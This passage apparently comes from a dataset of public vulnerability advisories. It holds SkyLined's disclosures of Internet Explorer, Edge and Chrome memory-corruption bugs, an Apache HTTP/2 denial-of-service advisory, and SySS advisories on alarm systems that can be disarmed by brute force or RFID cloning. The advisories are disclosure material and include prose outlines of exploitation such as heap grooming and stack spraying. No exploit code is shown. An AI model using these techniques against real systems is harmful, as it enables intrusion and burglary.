here: It is a use-after-free vulnerability where the span object in the
frame.html file is reused after being freed. It appears to be impossible
to reallocate the freed memory before it is reused. Part of the freed
memory is overwritten when it is freed because a WORD `FreeEntryOffset`
value is stored at offset 0. This value is then used as part of a
pointer to a vftable in order to call a method. This pointer now consist
of the upper 16-bits of the old vftable and the lower 16-bits contain
the `FreeEntryOffset` value. Exploitation is near impossible without a
way to have more control over this pointer in the freed memory block.
ZDI also did a more thorough analysis and [provide very similar details
in their advisory at
http://www.zerodayinitiative.com/advisories/ZDI-13-082/
Time-line
---------
* 27 September 2012: This vulnerability was found through fuzzing.
* 3 October 2012: This vulnerability was submitted to EIP.
* 11 October 2012: This vulnerability was rejected by EIP.
* 2 November 2012: This vulnerability was submitted to ZDI.
* 19 November 2012: This vulnerability was acquired by ZDI.
* 22 January 2013: This vulnerability was disclosed to Microsoft by ZDI.
* 29 May 2013: Microsoft addresses this vulnerability in MS13-037.
* 8 December 2016: Details of this vulnerability are released.
Cheers,
SkyLined"
2241,CVE-2015-1730: MSIE jscript9 Java­Script­Stack­Walker memory corruption details and PoC,,CVE-2015-1730,"Since November I have been releasing details on all vulnerabilities I
found in web-browsers that I had not released before. I will try to
continue to publish all my old vulnerabilities, including those not in
web-browser, as long as I can find some time to do so. If you find this
information useful, you can help me make more time available by donating
bitcoin to 183yyxa9s1s1f7JBp­PHPmz­Q346y91Rx5DX.
This is the twenty-sixth entry in the series. This information is
available in more detail on my blog at
http://blog.skylined.nl/20161206001.html. There you can find repros
that triggered this issue in addition to a Proof-of-Concept exploit, as
well as the information below.
Today's release is interesting, in part because it is an odd
vulnerability that I've not seen before or since: it's like a
stack-based use-after-free. The time-line is also interesting in that
ZDI first did not believe it to be exploitable and EIP thought it was a
duplicate of a bug they had already reported to Microsoft. Both turned
out to be wrong. Then I reported it to iDefense as well, who
accidentally send the details over plain-text email, causing ZDI to
reject my submission for fear of the bug leaking to the public. Luckily
for me, iDefense did end up acquiring the bug.
Follow me on http://twitter.com/berendjanwever for daily browser bugs.
MSIE jscript9 JavaScriptStackWalker memory corruption
=====================================================
(MS15-056, CVE-2015-1730)
Synopsis
--------
A specially crafted web-page can trigger a memory corruption
vulnerability in Microsoft Internet Explorer 9. A pointer set up to
point to certain data on the stack can be used after that data has been
removed from the stack. This results in a stack-based analog to a heap
use-after-free vulnerability. The stack memory where the data was stored
can be modified by an attacker before it is used, allowing remote code
execution.
Known affected software and attack vectors
------------------------------------------
* Microsoft Internet Explorer 9
An attacker would need to get a target user to open a specially
crafted web-page. Disabling JavaScript should prevent an attacker
from triggering the vulnerable code path.
Description
-----------
MSIE attempts to handle stack exhaustion caused by excessive recursion
in Javascript gracefully by generating a JavaScript exception. While
generating the exception, information about the call stack is gathered
using the JavascriptStackWalker class. It appears that the code that
does this initializes a pointer variable on the stack the first time it
is run, but re-uses it if it gets called a second time. Unfortunately,
the information the pointer points to is also stored on the stack, but
is removed from the stack after the first exception is handled. Careful
manipulation of the stack during both exceptions allow an attacker to
control the data the pointer points to during the second exception.
Exploit
-------
The vulnerable pointer points to valid stack memory during the first
exception, but it is ""popped"" from the stack before the second. In order
to exploit this vulnerability, the code executed during the first
exception is going to point this pointer to a specific area of the
stack, while the code executed during the second is going to allocate
certain values in that same area before the pointer is re-used.
Control over the stack contents during a stack exhaustion can be
achieved by making the recursive calls with many arguments, all of which
are stored on the stack. This is similar to a heap-spray storing values
on large sections of the heap in that it is not entirely deterministic,
but the odds are very highly in favor of you setting a certain value at
a certain address.
Further details of how to exploit this issue can be found in my blog at
http://blog.skylined.nl/20161206001.html
Time-line
---------
* 13 October 2012: This vulnerability was found through fuzzing.
* 29 October 2012: This vulnerability was submitted to EIP.
* 18 November 2012: This vulnerability was submitted to ZDI.
* 27 November 2012: EIP declines to acquire this vulnerability because
they believe it to be a copy of another vulnerability they already
acquired.
* 7 December 2012: ZDI declines to acquire this vulnerability because
they believe it not to be exploitable.
During the initial report detailed above, I did not have a working
exploit to prove exploitability. I also expected the bug to be fixed
soon, seeing how EIP believed they already reported it to Microsoft.
However, about two years later, I decided to look at the issue again and
found it had not yet been fixed. Apparently it was not the same issue
that EIP reported to Microsoft. So, I decided to try to have another
look and developed a Proof-of-Concept exploit.
* April 2014: I start working on this case again, and eventually
develop a working Proof-of-Concept exploit.
* 6 November 2014: ZDI was informed of the new analysis and reopens the
case.
* 15 November 2014: This vulnerability was submitted to iDefense.
* 16 November 2014: iDefense responds to my report email in plain text,
potentially exposing the full vulnerability details to world+dog.
* 17 November 2014: ZDI declines to acquire this vulnerability after
being informed of the potential information leak.
* 11 December 2012: This vulnerability was acquired by iDefense.
The accidentally potential disclosure of vulnerability details by
iDefense was of course a bit of a disappointment. They reported that
they have since updated their email system to automatically encrypt
emails, which should prevent this from happening again.
* 9 June 2015: Microsoft addresses this vulnerability in MS15-056.
* 6 December 2016: Details of this vulnerability are released.
Cheers,
SkyLined"
2242,Re: CVE-2016-3222: MS Edge CBaseScriptable::PrivateQueryInterface memory corruption,,CVE-2016-3222,"FYI: this link to my blog was 404 until early this morning. It is now up
if you are still interested in reading it.
On 05-12-2016 11:55, Berend-Jan Wever wrote:
> Since November I have been releasing details on all vulnerabilities I
> found in web-browsers that I had not released before. I will try to
> continue to publish all my old vulnerabilities, including those not in
> web-browser, as long as I can find some time to do so. If you find this
> information useful, you can help me make some time available by donating
> bitcoin to 183yyxa9s1s1f7JBp­PHPmz­Q346y91Rx5DX.
>
> This is the twenty-fifth entry in the series. This information is
> available in more detail on my blog at
> http://blog.skylined.nl/20161205001.html. There you can find repros
> that triggered this issue in addition to the information below.
>
> Today's release is interesting, as I accidentally published a repro for
> this as part of #DailyBug on twitter in May of this year, believing at
> the time that it was a simple NULL pointer:
> https://twitter.com/berendjanwever/status/729957166447218688
> I found out not to long after that, that it was actually a security
> vulnerability. Details on how this happened are below.
>
> Follow me on http://twitter.com/berendjanwever for daily browser bugs.
>
> MS Edge CBaseScriptable::PrivateQueryInterface memory corruption
> ================================================================
> (MS16-068, CVE-2016-3222)
>
> Synopsis
> --------
> A specially crafted web-page can trigger a memory corruption
> vulnerability in Microsoft Edge. I did not investigate this
> vulnerability thoroughly, so I cannot speculate on the potential impact
> or exploitability.
>
> Known affected software and attack vectors
> ------------------------------------------
> * Microsoft Edge
> An attacker would need to get a target user to open a specially
> crafted web-page. Disabling JavaScript does not prevent an attacker
> from triggering the vulnerable code path.
>
> Discovery
> ---------
> This issue was found through fuzzing in the 64-bit version of Microsoft
> Edge, in which the original repro triggered what appeared to be a NULL
> pointer dereference in `CBaseScriptable::PrivateQueryInterface`. So,
> after a very brief look at the repro, I filed a bug in the public Edge
> bug tracker and published it on twitter as part of #DailyBug.
>
> Soon after, I found another repro that trigger a slightly different NULL
> pointer dereference in `CBaseScriptable::PrivateQueryInterface` in a
> 64-bit version of Edge.
>
> I never tested the these two repros in a 32-bit version of Edge before
> publishing them, which I immediately regretted after finding that the
> second repro triggered an access violation using the obviously non-NULL
> address 0x1BF37D8 in a 32-bit version of Edge!
>
> Around this time, I started finding many variations of this bug: getting
> the type of various properties or objects associated with another window
> was triggering all kinds of access violations. Many of these were not
> using NULL pointers on 32-bit Edge.
>
> I looked again at the original `crypto` repro and noticed that although
> it triggered an access violation using a NULL pointer on both 32-bit and
> 64-bit versions of Edge, the two addresses (3 and 8 respectively) had
> different alignment. This is rather odd: true NULL pointer dereferences
> can cause an access violation at a different offset from NULL on these
> two architectures because property values and pointers stored before the
> one being read/written can have different sizes on 32-bit and 64-bit
> systems, but one usually expects them to have similar alignment: the
> last two bits of the address should be the same.
>
> Report
> ------
> If only I had tested the original repro in a 32-bit version of Edge when
> I first analyzed the issue, I might have realized it was more than a
> simple NULL pointer and not published it before doing additional research.
>
> I contacted ZDI and asked if they would be interested in buying the
> vulnerability at this point, given that I publicly released the repro
> that triggered a NULL pointer and filed it with Microsoft. I was hoping
> they would decide that this did not disclose the underlying
> vulnerability and that it as such would still be a 0-day. Unfortunately
> for me, they were not interested in acquiring details in this situation.
>
> At that point I decided to contact the Microsoft Security Response
> Center and report the additional information I had found. I also
> contacted a few people working on the Edge team at Microsoft directly to
> let them know they might want to escalate this bug from a simple NULL
> pointer to a security vulnerability. Unfortunately, this let them to
> decided to mark the bug I had filed in the Edge bug tracker as hidden. I
> warned them that this did little good, as the details were still public
> in my twitter and even if I deleted that, in general
> what goes on the internet stays on the internet.
>
> Analysis
> --------
> Since I had publicly released the repro, I was not going to be seeing
> any kind of reward for this bug, so analyzing the issue was not a
> priority for me. Unfortunately that meant I did not analyze it at all,
> other than to speculate that this bug was likely to have been a
> type-confusion or bad cast, where assembled code was used as data,
> leading to most of these repros triggering an access violation at a
> static address that depended on the code they were using as data. It may
> therefore be possible to find a variation that uses code that represents
> an address in the address space of Edge where an attacker might store
> data under his/her control. This is especially true for 32-bit Edge, as
> the address space is a lot smaller. Depending on what the code does with
> the address, it might be possible to execute arbitrary code under
> perfect circumstances.
>
> On Hiding bugs in public bug trackers
> -------------------------------------
> Hiding a publicly reported bug after the fact is a very bad idea IMHO,
> as it paints an easy to detect target on the bug. Every smart attacker
> should have a system that makes regular copies of all publicly reported
> bugs in target applications and reports to their owner all bugs that
> become hidden, with a copy of all the information it scraped from the
> bug before it was hidden. Since hiding a public bug only ever happens
> for one of two reasons: the bug was found to be a security issue, or the
> report accidentally contains personal information that the owner wants
> hidden. It should be quite easy to distinguish between the two to filter
> out the vulnerabilities, giving an attacker a nearly free stream of
> nearly 0-day bugs. If you work on a team that has a public bug-tracker,
> you may want to discuss this with your team and decided how to handle
> such situations.
>
> Conclusion
> ----------
> As useful as BugId is in automating a lot of the analysis I do on every
> bug I find, and in helping me prioritize the issues that are most
> likely to be vulnerabilities, it is not perfect and cannot always detect
> a vulnerability for what it is. BugId is not a perfect replacement for
> full manual analysis of bugs.
>
> In this case I relied to heavily on its ability to distinguish
> vulnerabilities from other bugs. Because of the nature of this issue,
> the repros caused access violations at static addresses, many of which
> near enough to NULL to be interpreted as NULL pointer dereferences,
> especially for the first repro I found. BugId can not actually determine
> the root cause of a crash, but attempts to deduce the root cause based
> on the details of the crash it causes. In this case, the crash looked
> too similar to a regular NULL pointer dereference for BugId to detect it
> as anything else.
>
> However, in my current situation, where I am finding *way* more bugs
> than I can analyze manually, BugId does a very good job at helping me
> prioritize and analyze issues. I have used BugId on hundreds of bugs
> and, as far as I know, this is the first time I mistook a security
> vulnerability for a regular bug based on the BugId report. As such, the
> false-negative rate I have experienced is a fraction of a percent, which
> IMHO is remarkably low and entirely acceptable. At the same time, the
> false-positive rate I have seen so far is exactly zero.
>
> In order to prevent this from happening in the future, I now test each
> repro in both the 32-bit and 64-bit version of Edge, do more manual
> analysis on bugs that get reported as a NULL pointer with a
> non-DWORD-aligned address (e.g. 3 in this case), and wait slightly
> longer for my fuzzers to find variations of a bug before I start my
> analysis and report the issue as a non-security bug.
>
> Time-line
> ---------
> * 29 April 2016: This vulnerability was first found through fuzzing.
> * 10 May 2016: This issue was published on Twitter and reported to
> Microsoft through the Edge bug tracker.
> * 13 May 2016: This vulnerability was submitted to ZDI.
> * 18 May 2016: This vulnerability was declined by ZDI.
> * 18 May 2016: This vulnerability was reported to MSRC and I informed
> Edge developers directly on the seriousness of the bug.
> * 18 May 2016: The issue was hidden in public bug tracker.
> * 14 June 2016: Microsoft addresses this vulnerability in MS16-068.
> * December 2016: Details of this vulnerability are released.
>
> Cheers,
>
> SkyLined
>"
2243,"CVE-2016-8740, Server memory can be exhausted and service denied when HTTP/2 is used",,CVE-2016-8740,"Security Advisory - Apache Software Foundation
Apache HTTPD WebServer / httpd.apache.org
Server memory can be exhausted and service denied when HTTP/2 is used
CVE-2016-8740
The Apache HTTPD web server (from 2.4.17-2.4.23) did not apply limitations
on request headers correctly when experimental module for the HTTP/2
protocol is used to access a resource.
The net result is that a the server allocates too much memory instead of denying
the request. This can lead to memory exhaustion of the server by a properly
crafted request.
Background:
- -----------
Apache has limits on the number and length of request header fields. which
limits the amount of memory a client can allocate on the server for a request.
Version 2.4.17 of the Apache HTTP Server introduced an experimental feature:
mod_http2 for the HTTP/2 protocol (RFC7540, previous versions were known as
Google SPDY).
This module is NOT compiled in by default -and- is not enabled by default,
although some distribution may have chosen to do so.
It is generally needs to be enabled in the 'Protocols' line in httpd by
adding 'h2' and/or 'h2c' to the 'http/1.1' only default.
The default distributions of the Apache Software Foundation do not include
this experimental feature.
Details:
- --------
- From version 2.4.17, upto and including version 2.4.23 the server failed
to take the limitations on request memory use into account when providing
access to a resource over HTTP/2. This issue has been fixed
in version 2.4.23 (r1772576).
As a result - with a request using the HTTP/2 protocol a specially crafted
request can allocate memory on the server until it reaches its limit. This can
lead to denial of service for all requests against the server.
Impact:
- -------
This can lead to denial of service for all server resources.
Versions affected:
- ------------------
All versions from 2.4.17 to 2.4.23.
Resolution:
- -----------
For a 2.4.23 version a patch is supplied. This will be included in the
next release.
Mitigations and work arounds:
- -----------------------------
As a temporary workaround - HTTP/2 can be disabled by changing
the configuration by removing h2 and h2c from the Protocols
line(s) in the configuration file.
The resulting line should read:
Protocols http/1.1
Credits and timeline
- --------------------
The flaw was found and reported by Naveen Tiwari <naveen.tiwari asu edu>
and CDF/SEFCOM at Arizona State University on 2016-11-22. The issue was
resolved by Stefan Eissing and incorporated in the Apache repository,
ready for inclusion in the next release.
Apache would like to thank all involved for their help with this.
Patch against 2.4.23 release source:"
2265,[SYSS-2016-064] Multi Kon Trade M2B GSM Wireless Alarm System - Improper Restriction of Excessive Authentication Attempts (CWE-307),CWE-307,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2016-064
Product: M2B GSM Wireless Alarm System
Manufacturer: Multi Kon Trade
Affected Version(s): Unspecified
Tested Version(s): Unspecified
Vulnerability Type: Improper Restriction of Excessive Authentication
Attempts (CWE-307)
Risk Level: High
Solution Status: Open
Manufacturer Notification: 2016-07-05
Solution Date: -
Public Disclosure: 2016-11-23
CVE Reference: Not yet assigned
Author of Advisory: Gerhard Klostermeier, SySS GmbH
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
The M2B GSM wireless alarm system by Multi Kon Trade (MKT) was tested
for possible security issues.
Some features of this alam system as described by the manufacturer are
(see [1]):
* You will be noticed of any alarm by call or by SMS message.
* The alarm system has a battery which will last 6 to 8 hours in case
of a blackout.
* You can pair up to 99 devices (sensors, remote control, etc.).
* You do not have to run any cables. Everything is wireless.
* It is possible to trigger alarms in case of fire, even if the
alarm is disabled.
* It is possible to trigger the alarm with a delay.
Due to an insecure implementation of the used 433 MHz radio
communication, the wireless alarm system M2B GSM is vulnerable to
brute-force attacks.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
SySS GmbH found out that the 433 MHz radio communication of the wireless
alarm system M2B GSM has no protection against brute-force attacks.
A valid (paired) remote control is identified through its eight
characters long identifier. A character is either ""0"", ""1"" or ""f""
(floating) (see [2]). Thus, it is possible to send any command signal
for all possible identifiers. Via such a brute-force attack, for
instance, it is possible to disarm an armed M2B GSM wireless alarm
system remotely in an unauthorized manner.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
SySS GmbH build a small device that is able to arm and disarm every M2B
GSM wireless alarm system within its radio range in max. 40 minutes.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
An extra anti-jammer device is purchasable by the Vendor. This sensor
should detect malicious devices that are trying to disarm system using
the brute-force method. If such a device is detected the alarm will
be triggered. (Solution as suggested by the vendor.)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2016-07-05: Vulnerability reported to manufacturer
2016-10-13: Response from the vendor with the solution on how to
mitigate the risk
2016-11-23: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] M2B GSM Wireless Alarm System, Multi Kon Trade
http://multikontrade.de/GSM-Funk-Alarmanlage
[2] PT2260 Remote Control Encoder, Princeton Technology Corp.
http://www.princeton.com.tw/Portals/0/Product/PT2260_4.pdf
[3] SySS Security Advisory SYSS-2016-064
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2016-064.txt
[4] SySS GmbH, SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Gerhard Klostermeier of SySS
GmbH.
E-Mail: gerhard.klostermeier (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Gerhard_Klostermeier.asc
Key fingerprint = 8A9E 75CC D510 4FF6 8DB5 CC30 3802 3AAB 573E B2E7
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIcBAEBCgAGBQJYNCglAAoJENmkv2o0rU2rgBYQAJB8N3DfO1TbmMszMRv7XBOS
TIENtQ2lVEGiKV6TMReHu/7GjFYa/KNvE6129fBs6CC/LokySV6OttU7vLbpxXf4
z1Kcur/W7ztd6eRm0YCsBby908tEB0t/vW0pzDd58b76AAJkyxHW4/uGYSlXaJdl
IkUUU1kYkuKuiLsqtjNTsEYCxDB9ZGslngFdZsGCZbXSwYiZOCNIuHWi+rb+Auu2
ypNf6/JdDV7G2iKTZy8oOQBk2oOsiF09CeuNJ5DNS5Mr+NJupFK4PsxoHYWqZnaq
95tMcuXAJacPHb+tBmzEeiE303pCFuCOwRxPAUDG+iwlBfbY1+s5RqvbYyP1PFRI
xMbCSFwUoG5Kyko6JHV/lDAleKP2Dt4IgFu9VN6Tg2BARF6wtAaVa74RfjSm9YjA
g1HUfm2hz+qKM6pbSdVx4JeKDMi6/8tk3KzFb+APNqhEvgNQa3GGiJEH6KpqGhzN
bwUrqlqHPuGX+07CG42Y3klWXJXEqfW0p7LEMq2FDP514JLk2JxmBwrnHrW7nkQb
fzNH9qBEzYfY4Wli+3lAK3wN2+lNlmMecymGTzhu3HGnCOhbbc5Q1gd4cwxayZPJ
nbGAIcG8N4QyNTdJIHTod7Ic6wZH2D3hezoxSW7ConI8NogYaNRwZ3Gg3biNsG5t
61wisI5oiJ7tShQnO1p2
=8JO2
-----END PGP SIGNATURE-----"
2266,[SYSS-2016-107] EASY HOME Alarmanlagen-Set - Cryptographic Issues (CWE-310),CWE-310,,"-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512
Advisory ID: SYSS-2016-107
Product: EASY HOME Alarmanlagen-Set
Manufacturer: monolith GmbH
Affected Version(s): Model No. MAS-S01-09
Tested Version(s): Model No. MAS-S01-09
Vulnerability Type: Cryptographic Issues (CWE-310)
Risk Level: Low
Solution Status: Open
Manufacturer Notification: 2016-10-05
Solution Date: -
Public Disclosure: 2016-11-23
CVE Reference: Not yet assigned
Author of Advisory: Gerhard Klostermeier (SySS GmbH)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Overview:
The EASY HOME MAS-S01-09 is a wireless alarm system with different
features sold by ALDI S�D.
Some of the features as described in the German product manual are
(see [1]):
""
- - Alarmanlagen-Set mit drahtlosen Sensoren und Mobilfunk-Anbindung
- - SOS-Modus, Stiller Alarm, �berwachungs- und Intercom-Funktion
- - Integrierte Quad-Band Mobilfunkeinheit f�r GSM-Netze im 850 / 900 /
1800 / 1900 MHz-Bereich
- - Alarmbenachrichtigung auf externe Telefone
- - Eingebaute Sirene (ca. 90 dB), inkl. Anschluss f�r externe Sirene
- - Unterst�tzung f�r bis zu 98 kabellosen Sensoren / bis zu 4
kabelgebundene Sensoren
- - Stromausfallsicherung der Basiseinheit durch 4 x AAA
Alkaline-Batterien
- - Fernbedienbar per Telefon
""
Due to the use of an insecure 125 kHz RFID technology, RFID tokens of
the EASY HOME MAS-S01-09 wireless alarm system can easily be cloned and
used to deactivate the alarm system in an unauthorized way.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Vulnerability Details:
SySS GmbH found out that the 125 kHz RFID technology used by the EASY
HOME MAS-S01-09 wireless alarm system has no protection by means of
authentication against rogue/cloned RFID tokens.
The information stored on the used RFID tokens can be read easily in a
very short time from distances up to 1 meter, depending on the used
RFID reader. A working cloned RFID token is ready for use within a
couple of seconds using freely available tools.
Thus, an attacker with one-time access to the information of an RFID
token of an EASY HOME MAS-S01-09 wireless alarm system is able to create
a rogue RFID token that can be used to deactivate the alarm system in
an unauthorized manner.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Proof of Concept (PoC):
SySS GmbH could successfully clone an RFID token of an EASY HOME
MAS-S01-09 wireless alarm system using a freely available off-the-shelf
tool and disarm the wireless alarm system in an unauthorized way.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Solution:
SySS GmbH is not aware of a solution for this reported security
vulnerability concerning the tested product version.
For further information please contact the manufacturer.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclosure Timeline:
2016-10-05: Vulnerability reported to manufacturer
2016-10-12: E-mail to manufcaturer concerning the status of the reported
security issue
2016-11-23: Public release of security advisory
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
References:
[1] Product manual of EASY HOME MAS-S01-09 wireless alarm system
http://monolith-shop.de/wp-content/uploads/2016/09/MAS-S01-09_Alarmanlage_Bedienungsanleitung.pdf
[2] SySS Security Advisory SYSS-2016-107
https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2016-107.txt
[3] SySS GmbH, SySS Responsible Disclosure Policy
https://www.syss.de/en/news/responsible-disclosure-policy/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Credits:
This security vulnerability was found by Gerhard Klostermeier of SySS
GmbH.
E-Mail: gerhard.klostermeier (at) syss.de
Public Key: https://www.syss.de/fileadmin/dokumente/PGPKeys/Gerhard_Klostermeier.asc
Key fingerprint = 8A9E 75CC D510 4FF6 8DB5 CC30 3802 3AAB 573E B2E7
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Disclaimer:
The information provided in this security advisory is provided ""as is""
and without warranty of any kind. Details of this security advisory may
be updated in order to provide as accurate information as possible. The
latest version of this security advisory is available on the SySS Web
site.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Copyright:
Creative Commons - Attribution (by) - Version 3.0
URL: http://creativecommons.org/licenses/by/3.0/deed.en
-----BEGIN PGP SIGNATURE-----
iQIcBAEBCgAGBQJYNChyAAoJENmkv2o0rU2r4MwQAKTTTRhqNyMi34MxOxUBDAQu
ro3KnFe9C20jiDgnXhLNpwEjsDhqiI4VizScDPQ9EvLE5j5qA0M4SaPn3AZtIiDh
XzKQFJ9Zqoe9COetmx8bEEtCTE1zz5WNy+MNNNqBPGKoIaM54Bcfp9u2W1fQhYW6
m0oTM/y3PPBG7R1xX5el5XPvrqu1Ic2Wr3aT7/MCSApk2cWQic4btERsnhFv4m1N
8bP0Ez9gNsgMRMzxV0vAS1f7AXJLh2tXxdFARhf5S6hnyMxiRpwDeStr6sOUWOTm
iMWIGvptD/kFyJXsg8wLM7h4pqA/Ie9IXe3qETzH83bAEALggb3nT0vFRcPiMeOG
mod89SkoyYNLFxIiwPGu4pBbO/7KYMhv7g9hWsG6vr3TDEe5YTKyLj3XtBiDZsow
pVi2ZazSSbVRuuX8u64H81A5x3s/uNjkGccgHAn82sadq4sLeoLTS0feTP1yeZMD
XdjpmjAt8eLS2CZ/BZlFLGWCdEgBaJ0J2eq/9kmLQ5jiw7nQ6eq0U2Yfpf4B8Q2O
cmrLf3zdILD2Mu3PIGYKFvoEU5CZUXyND/ZaP87ct//lxLfUDeZKhP75aaeYu12I
1osGB8bYRbRxvhU9drTYSEjWUY4r6uiZKsX4BNdCZ/VLo0wNQ/30Qd5SMvYchJeg
9UJ3zmd/Ski5EX2Lfj+x
=6RpX
-----END PGP SIGNATURE-----"
2269,CVE-2015-1251: Chrome blink Speech­Recognition­Controller use-after-free details,,CVE-2015-1251,"Throughout November, I plan to release details on vulnerabilities I
found in web-browsers which I've not released before. This is the
seventeenth entry in that series. Unfortunately I won't be able to
publish everything within one month at the current rate, so I may
continue to publish these through December and January.
The below information is available in more detail on my blog at
http://blog.skylined.nl/20161123001.html. There you can find a repro
that triggered this issue, snippets from the vulnerable source and more
details in addition to the information below.
Follow me on http://twitter.com/berendjanwever for daily browser bugs.
Chrome blink SpeechRecognitionController use-after-free
=======================================================
(Chromium 455857, CVE-2015-1251)
Synopsis
--------
A specially crafted web-page can cause the blink rendering engine used
by Google Chrome and Chromium to continue to use a speech recognition
API object after the memory block that contained the object has been
freed. An attacker can force the code to read a pointer from the freed
memory and use this to call a function, allowing arbitrary code execution.
Known affected software and attack vectors
------------------------------------------
+ Google Chrome 39.0
An attacker would need to get a target user to open a specially
crafted webpage. Disabling Javascript should prevent an attacker from
triggering the vulnerable code path.
Description
-----------
Creating a `webkitSpeechRecognition` Javascript object in a popup window
before closing the popup frees a C++ object used internally by the
speech recognition API code but leaves a dangling pointer to the freed
memory in another C++ object. When the `start()` Javascript method is
called, this dangling pointer is used to try to read a function pointer
from a virtual function table and call that function. An attacker has
ample time to groom the heap between the free and re-use in order to
control the function pointer used by the code, allowing arbitrary code
execution.
Exploit
-------
An attacker looking to exploit this issue is going to want to try and
control the contents of the freed memory, before getting the code to use
the dangling pointer to call a virtual function. Doing so would allow an
attacker to execute arbitrary code. This is made possible because steps
5 and 6 can both be triggered at a time of the attackers choosing,
giving the attacker the ability to free the memory in step 5 whenever
this is convenient and attempt to reallocate and fill it with any data
before executing step 6. This should allow an attacker to create a fake
`vftable` pointer and gain arbitrary code execution. In order to develop
a working exploit, existing mitigations will need to be bypassed, most
significantly ASLR and DEP. As this vulnerability by itself does not
appear to allow bypassing these mitigations, I did not develop a working
exploit for it.
Time-line
---------
* November 2014: This vulnerability was found through fuzzing.
* December 2014: This vulnerability was submitted to ZDI and iDefense.
* January 2015: This vulnerability was acquired by ZDI.
* February 2015: This vulnerability was fixed in revision 190993.
* May 2015: This vulnerability was addressed by Google in
Chrome 43.0.2357.65.
* November 2016: Details of this issue are released.
Cheers,
SkyLined"
2273,CVE-2015-0050: Microsoft Internet Explorer 8 MSHTML SRunPointer::SpanQualifier/RunType OOB read details,,CVE-2015-0050,"Throughout November, I plan to release details on vulnerabilities I
found in web-browsers which I've not released before. This is the
sixteenth entry in that series. Unfortunately I won't be able to
publish everything within one month at the current rate, so I may
continue to publish these through December and January.
The below information is available in more detail on my blog at
http://blog.skylined.nl/20161122001.html. There you can find a repro
that triggered this issue in addition to the information below.
Follow me on http://twitter.com/berendjanwever for daily browser bugs.
MSIE 8 MSHTML SRunPointer::SpanQualifier/RunType OOB read
=========================================================
(MS15-009, CVE-2015-0050)
Synopsis
--------
A specially crafted web-page can cause Microsoft Internet Explorer 8 to
attempt to read data beyond the boundaries of a memory allocation. The
issue does not appear to be easily exploitable.
Known affected software, attack vectors and mitigations
-------------------------------------------------------
* Microsoft Internet Explorer 8
An attacker would need to get a target user to open a specially
crafted web-page. Disabling Javascript should prevent an attacker
from triggering the vulnerable code path.
Description
-----------
The issue requires rather complex manipulation of the DOM and results in
reading a value immediately following an object. The lower three bits of
this value are returned by the function doing the reading, resulting in
a return value in the range 0-7. After exhaustively skipping over the
read AV and having that function return each value, no other side
effects were noticed. For that reason I assume this issue is hard if not
impossible to exploit and did not investigate further. It is still
possible that there may be subtle effects that I did not notice that
allow exploitation in some form or other.
Time-line
---------
* *June 2014*: This vulnerability was found through fuzzing.
* *October 2014*: This vulnerability was submitted to ZDI.
* *October 2014*: This vulnerability was rejected by ZDI.
* *November 2014*: This vulnerability was reported to MSRC.
* *February 2015*: This vulnerability was addressed by Microsoft in
MS15-009.
* *November 2016*: Details of this issue are released.
Cheers,
SkyLined"
2286,CVE-2016-3247 Microsoft Edge CTextExtractor::GetBlockText OOB read details,,CVE-2016-3247,"Throughout November, I plan to release details on vulnerabilities I
